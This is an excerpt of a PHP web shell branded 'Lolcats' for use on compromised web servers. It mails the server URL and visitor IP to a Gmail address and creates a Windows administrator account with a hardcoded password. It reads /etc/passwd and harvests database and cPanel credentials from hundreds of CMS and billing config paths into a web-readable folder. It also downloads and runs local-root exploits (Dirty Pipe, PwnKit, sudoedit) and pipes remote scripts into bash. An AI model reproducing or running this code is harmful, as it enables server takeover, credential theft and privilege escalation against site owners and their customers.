...
$gcw = "getcwd";
# Buat report ke email ente, ini codenya:
ini_set('memory_limit', '-1'); header('Content-Type: text/html; charset=UTF-8'); $halobego = 'elisathaliaaurora@gmail.com'; $kawai = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $begolu = "URL: $kawai | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($halobego, "LOLCATS BYPASS CLOUDFLARE", $begolu, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");// login
#function login() {
#echo "<style>input{margin:0;background-color:white;border:transparent;}</style>
#<form method=post><input type=password name=p></form>";
#exit;
#}
#if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
#	if(empty($password) || (isset($_7['p']) && (base64_encode($_7['p']) == $password) ) )
	...
	<div class='py-3' id='main'>
		...
		<div class='text-center'>
			<div class='btn-group'>
				...
				<a class='btn btn-outline-light btn-sm' href='?logout'><i class='bi bi-box-arrow-in-left'></i> Logout! </a>
			</div>
		</div>";
		...
		echo '<center class="anu">Create RDP</center>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("net user lolcats b4b1raga#1337 /add", $path).exe_root("net localgroup administrators lolcats /add", $path).'<br>If there is no "Access is denied." output, chances are that you have succeeded in creating a user here. Just log in using the username and password below.
...
password: b4b1raga#1337</code></pre>
		...
		if($_7['id'] == 'autoroot'){
		ob_implicit_flush();ob_end_flush();
		echo '<center class="anu">Auto Root by Lolcats</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
...
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-4258' class='text-decoration-none text-light'>CVE-2010-8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD</a><br>
...
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2010/CVE-2010-8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD Dereference Privilege Escalation</a><br>
...
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2011/CVE-2011-8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzDPointer Overwrite</a><br>
...
<input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
	...
	if(file_exists('babidetect.php')) {
		...
		// config grabber
		if($_7['id'] == 'config'){
	echo '<center class="anu"><br>Grab Config by Lolcats</center>';
	$etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd:(</rd>");
	$idx = mkdir("lolcats_CONFIG", 0777);
	$isi_htc = "Options allnRequire NonenSatisfy Any";
	$htc = fopen("lolcats_CONFIG/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			...
			foreach($user_config[1] as $lolcats) {
				$user_config_dir = "/home/$lolcats/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$lolcats/.my.cnf" => "cpanel",
						"/home/$lolcats/.accesshash" => "WHM-accesshash",
							"/home/$lolcats/config/koneksi.php" => "Lokomedia",
							"/home/$lolcats/forum/config.php" => "phpBB",
							"/home/$lolcats/sites/default/settings.php" => "Drupal",
							"/home/$lolcats/config/settings.inc.php" => "PrestaShop",
							"/home/$lolcats/app/etc/local.xml" => "Magento",
							"/home/$lolcats/admin/config.php" => "OpenCart",
							"/home/$lolcats/application/config/database.php" => "Ellislab",
							"/home/$lolcats/vb/includes/config.php" => "Vbulletin",
							"/home/$lolcats/includes/config.php" => "Vbulletin",
							"/home/$lolcats/forum/includes/config.php" => "Vbulletin",
							"/home/$lolcats/forums/includes/config.php" => "Vbulletin",
							"/home/$lolcats/cc/includes/config.php" => "Vbulletin",
							"/home/$lolcats/inc/config.php" => "MyBB",
							"/home/$lolcats/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/shop/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/os/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/oscom/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/products/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/cart/includes/configure.php" => "OsCommerce",
							"/home/$lolcats/inc/conf_global.php" => "IPB",
							"/home/$lolcats/wp-config.php" => "Wordpress",
							"/home/$lolcats/wp/test/wp-config.php" => "Wordpress",
							"/home/$lolcats/blog/wp-config.php" => "Wordpress",
							"/home/$lolcats/beta/wp-config.php" => "Wordpress",
							"/home/$lolcats/portal/wp-config.php" => "Wordpress",
							"/home/$lolcats/site/wp-config.php" => "Wordpress",
							"/home/$lolcats/wp/wp-config.php" => "Wordpress",
							"/home/$lolcats/WP/wp-config.php" => "Wordpress",
							"/home/$lolcats/news/wp-config.php" => "Wordpress",
							"/home/$lolcats/wordpress/wp-config.php" => "Wordpress",
							"/home/$lolcats/test/wp-config.php" => "Wordpress",
							"/home/$lolcats/demo/wp-config.php" => "Wordpress",
							"/home/$lolcats/home/wp-config.php" => "Wordpress",
							"/home/$lolcats/v1/wp-config.php" => "Wordpress",
							"/home/$lolcats/v2/wp-config.php" => "Wordpress",
							"/home/$lolcats/press/wp-config.php" => "Wordpress",
							"/home/$lolcats/new/wp-config.php" => "Wordpress",
							"/home/$lolcats/blogs/wp-config.php" => "Wordpress",
							"/home/$lolcats/configuration.php" => "Joomla",
							"/home/$lolcats/blog/configuration.php" => "Joomla",
							"/home/$lolcats/submitticket.php" => "^WHMCS",
							"/home/$lolcats/cms/configuration.php" => "Joomla",
							"/home/$lolcats/beta/configuration.php" => "Joomla",
							"/home/$lolcats/portal/configuration.php" => "Joomla",
							"/home/$lolcats/site/configuration.php" => "Joomla",
							"/home/$lolcats/main/configuration.php" => "Joomla",
							"/home/$lolcats/home/configuration.php" => "Joomla",
							"/home/$lolcats/demo/configuration.php" => "Joomla",
							"/home/$lolcats/test/configuration.php" => "Joomla",
							"/home/$lolcats/v1/configuration.php" => "Joomla",
							"/home/$lolcats/v2/configuration.php" => "Joomla",
							"/home/$lolcats/joomla/configuration.php" => "Joomla",
							"/home/$lolcats/new/configuration.php" => "Joomla",
							"/home/$lolcats/WHMCS/submitticket.php" => "WHMCS",
							"/home/$lolcats/whmcs1/submitticket.php" => "WHMCS",
							"/home/$lolcats/Whmcs/submitticket.php" => "WHMCS",
							"/home/$lolcats/whmcs/submitticket.php" => "WHMCS",
							"/home/$lolcats/whmcs/submitticket.php" => "WHMCS",
							"/home/$lolcats/WHMC/submitticket.php" => "WHMCS",
							"/home/$lolcats/Whmc/submitticket.php" => "WHMCS",
							"/home/$lolcats/whmc/submitticket.php" => "WHMCS",
							"/home/$lolcats/WHM/submitticket.php" => "WHMCS",
							"/home/$lolcats/Whm/submitticket.php" => "WHMCS",
							"/home/$lolcats/whm/submitticket.php" => "WHMCS",
							"/home/$lolcats/HOST/submitticket.php" => "WHMCS",
							"/home/$lolcats/Host/submitticket.php" => "WHMCS",
							"/home/$lolcats/host/submitticket.php" => "WHMCS",
							"/home/$lolcats/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$lolcats/Supportes/submitticket.php" => "WHMCS",
							"/home/$lolcats/supportes/submitticket.php" => "WHMCS",
							"/home/$lolcats/domains/submitticket.php" => "WHMCS",
							"/home/$lolcats/domain/submitticket.php" => "WHMCS",
							"/home/$lolcats/Hosting/submitticket.php" => "WHMCS",
							"/home/$lolcats/HOSTING/submitticket.php" => "WHMCS",
							"/home/$lolcats/hosting/submitticket.php" => "WHMCS",
							"/home/$lolcats/CART/submitticket.php" => "WHMCS",
							"/home/$lolcats/Cart/submitticket.php" => "WHMCS",
							"/home/$lolcats/cart/submitticket.php" => "WHMCS",
							"/home/$lolcats/ORDER/submitticket.php" => "WHMCS",
							"/home/$lolcats/Order/submitticket.php" => "WHMCS",
							"/home/$lolcats/order/submitticket.php" => "WHMCS",
							"/home/$lolcats/CLIENT/submitticket.php" => "WHMCS",
							"/home/$lolcats/Client/submitticket.php" => "WHMCS",
							"/home/$lolcats/client/submitticket.php" => "WHMCS",
							"/home/$lolcats/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$lolcats/Clientarea/submitticket.php" => "WHMCS",
							"/home/$lolcats/clientarea/submitticket.php" => "WHMCS",
							"/home/$lolcats/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$lolcats/Support/submitticket.php" => "WHMCS",
							"/home/$lolcats/support/submitticket.php" => "WHMCS",
							"/home/$lolcats/BILLING/submitticket.php" => "WHMCS",
							"/home/$lolcats/Billing/submitticket.php" => "WHMCS",
							"/home/$lolcats/billing/submitticket.php" => "WHMCS",
							"/home/$lolcats/BUY/submitticket.php" => "WHMCS",
							"/home/$lolcats/Buy/submitticket.php" => "WHMCS",
							"/home/$lolcats/buy/submitticket.php" => "WHMCS",
							"/home/$lolcats/MANAGE/submitticket.php" => "WHMCS",
							"/home/$lolcats/Manage/submitticket.php" => "WHMCS",
							"/home/$lolcats/manage/submitticket.php" => "WHMCS",
							"/home/$lolcats/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$lolcats/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$lolcats/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$lolcats/clientsupport/submitticket.php" => "WHMCS",
							"/home/$lolcats/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$lolcats/Checkout/submitticket.php" => "WHMCS",
							"/home/$lolcats/checkout/submitticket.php" => "WHMCS",
							"/home/$lolcats/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$lolcats/Billings/submitticket.php" => "WHMCS",
							"/home/$lolcats/billings/submitticket.php" => "WHMCS",
							"/home/$lolcats/BASKET/submitticket.php" => "WHMCS",
							"/home/$lolcats/Basket/submitticket.php" => "WHMCS",
							"/home/$lolcats/basket/submitticket.php" => "WHMCS",
							"/home/$lolcats/SECURE/submitticket.php" => "WHMCS",
							"/home/$lolcats/Secure/submitticket.php" => "WHMCS",
							"/home/$lolcats/secure/submitticket.php" => "WHMCS",
							"/home/$lolcats/SALES/submitticket.php" => "WHMCS",
							"/home/$lolcats/Sales/submitticket.php" => "WHMCS",
							"/home/$lolcats/sales/submitticket.php" => "WHMCS",
							"/home/$lolcats/BILL/submitticket.php" => "WHMCS",
							"/home/$lolcats/Bill/submitticket.php" => "WHMCS",
							"/home/$lolcats/bill/submitticket.php" => "WHMCS",
							"/home/$lolcats/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$lolcats/Purchase/submitticket.php" => "WHMCS",
							"/home/$lolcats/purchase/submitticket.php" => "WHMCS",
							"/home/$lolcats/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$lolcats/Account/submitticket.php" => "WHMCS",
							"/home/$lolcats/account/submitticket.php" => "WHMCS",
							"/home/$lolcats/USER/submitticket.php" => "WHMCS",
							"/home/$lolcats/User/submitticket.php" => "WHMCS",
							"/home/$lolcats/user/submitticket.php" => "WHMCS",
							"/home/$lolcats/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$lolcats/Clients/submitticket.php" => "WHMCS",
							"/home/$lolcats/clients/submitticket.php" => "WHMCS",
							"/home/$lolcats/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$lolcats/Billings/submitticket.php" => "WHMCS",
							"/home/$lolcats/billings/submitticket.php" => "WHMCS",
							"/home/$lolcats/MY/submitticket.php" => "WHMCS",
							"/home/$lolcats/My/submitticket.php" => "WHMCS",
							"/home/$lolcats/my/submitticket.php" => "WHMCS",
							"/home/$lolcats/secure/whm/submitticket.php" => "WHMCS",
							"/home/$lolcats/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$lolcats/panel/submitticket.php" => "WHMCS",
							"/home/$lolcats/clientes/submitticket.php" => "WHMCS",
							"/home/$lolcats/cliente/submitticket.php" => "WHMCS",
							"/home/$lolcats/support/order/submitticket.php" => "WHMCS",
							"/home/$lolcats/bb-config.php" => "BoxBilling",
							"/home/$lolcats/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$lolcats/box/bb-config.php" => "BoxBilling",
							"/home/$lolcats/host/bb-config.php" => "BoxBilling",
							"/home/$lolcats/Host/bb-config.php" => "BoxBilling",
							"/home/$lolcats/supportes/bb-config.php" => "BoxBilling",
							"/home/$lolcats/support/bb-config.php" => "BoxBilling",
							"/home/$lolcats/hosting/bb-config.php" => "BoxBilling",
							"/home/$lolcats/cart/bb-config.php" => "BoxBilling",
							"/home/$lolcats/order/bb-config.php" => "BoxBilling",
							"/home/$lolcats/client/bb-config.php" => "BoxBilling",
							"/home/$lolcats/clients/bb-config.php" => "BoxBilling",
							"/home/$lolcats/cliente/bb-config.php" => "BoxBilling",
							"/home/$lolcats/clientes/bb-config.php" => "BoxBilling",
							"/home/$lolcats/billing/bb-config.php" => "BoxBilling",
							"/home/$lolcats/billings/bb-config.php" => "BoxBilling",
							"/home/$lolcats/my/bb-config.php" => "BoxBilling",
							"/home/$lolcats/secure/bb-config.php" => "BoxBilling",
							"/home/$lolcats/support/order/bb-config.php" => "BoxBilling",
							"/home/$lolcats/includes/dist-configure.php" => "Zencart",
							"/home/$lolcats/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$lolcats/products/includes/dist-configure.php" => "Zencart",
							"/home/$lolcats/cart/includes/dist-configure.php" => "Zencart",
							"/home/$lolcats/shop/includes/dist-configure.php" => "Zencart",
							"/home/$lolcats/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/host/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/Host/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/support/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/cart/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/order/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/client/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/clients/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/billing/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/billings/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/my/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/secure/includes/iso4217.php" => "Hostbills",
							"/home/$lolcats/support/order/includes/iso4217.php" => "Hostbills");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("lolcats_CONFIG/$lolcats-$nama_config.txt","w");
	...
	echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/lolcats_CONFIG'><font>Click Here</font></a></center>";
		}
		// adminer
		if($_7['id'] == 'adminer'){
	...
	if(file_exists('adminer.php')) {
		...
		if (isset($_GET['dir']) && $_GET['id'] == "scanroot") {
			ob_implicit_flush();ob_end_flush();s();
			echo '<center class="anu">Scan Root by Lolcats</center>';
			echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
			...
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/lolcatsrooting/")) {
					mkdir($path."/lolcatsrooting");
					exe_root("curl https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/lolcatsrooting");
					exe_root("tar -xf auto.tar.gz", $path."/lolcatsrooting");
					if (!file_exists($path."/lolcatsrooting/netfilter")) {
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe_root("timeout 10 ./lolcatsrooting/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./lolcatsrooting/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./lolcatsrooting/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/lolcatsrooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./lolcatsrooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/lolcatsrooting").''.exe_root("rm -rf lolcatsrooting", $path).'</code></pre>
					</div>
				</div>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/esg.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan2") {
				if (!file_exists($path."/lolcatsrooting/")) {
					mkdir($path."/lolcatsrooting");
					exe("curl https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/lolcatsrooting");
					exe("tar -xf auto.tar.gz", $path."/lolcatsrooting");
					if (!file_exists($path."/lolcatsrooting/netfilter")) {
						die("<center class='anu'>Failed to Download Material!</center>");
					}
				}
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe("timeout 10 ./lolcatsrooting/netfilter", $path).'Ptrace : '.exe("echo id | timeout 10 ./lolcatsrooting/ptrace", $path).'Sequoia : '.exe("timeout 10 ./lolcatsrooting/sequoia", $path).'OverlayFS : '.exe("echo id | timeout 10 ./overlayfs", $path."/lolcatsrooting").'Dirtypipe : '.exe("echo id | timeout 10 ./lolcatsrooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe("echo id | timeout 10 ./pwnkit", $path."/lolcatsrooting").''.exe("rm -rf lolcatsrooting", $path).'</code></pre>
					</div>
				</div>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("curl -Lsk https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/esg.sh | bash", $path).'</code></pre>
					</div>
				</div>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/lpe.sh | bash", $path).'</code></pre>
					</div>
				</div>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("curl -Lsk https://raw.githubusercontent.com/newbee1337/lolcatss-minishell/main/tools/lpe.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			}
		}
		...
		</div><center><div class='text-secondary'><hr><font color=white>&#128473; LOLCATS STILL N00B &#128473;</font></div></center>
	</div>
</div>
</body>
</html>
